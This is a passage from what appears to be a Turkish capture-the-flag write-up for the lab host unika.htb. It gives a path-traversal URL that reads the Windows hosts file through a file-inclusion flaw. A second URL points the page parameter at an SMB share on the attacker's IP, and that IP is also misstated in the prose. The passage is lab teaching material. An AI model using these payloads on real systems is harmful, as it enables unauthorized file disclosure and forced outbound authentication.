...
Web tarayıcısında [http://unika.htb/index.php?page=../../../../../windows/system32/drivers/etc/hosts](http://unika.htb/index.php?page=../../../../../windows/system32/drivers/etc/hosts) adresine git. Bu sayfaya başarılı bir şekilde erişilebiliyorsa File Inclusion zafiyeti hedef makinede mevcut demektir. Bu zafiyet kullanılarak, web sitesinde bulunan ama kullanıcılar ile paylaşılmayan dosyalar (`/etc/hosts`) görüntülenebilir.
...
Ardından web tarayıcısında [http://unika.htb/index.php?page=//10.10.14.216/somefile](http://unika.htb/index.php?page=//10.10.14.216/somefile) adresine gitmeliyiz. Burada SMB Share için yerel makinemizin IP adresini (10.10.14.2016) belirttik. Ardından gelen dosya ismi (`somefile`) önemsizdir.
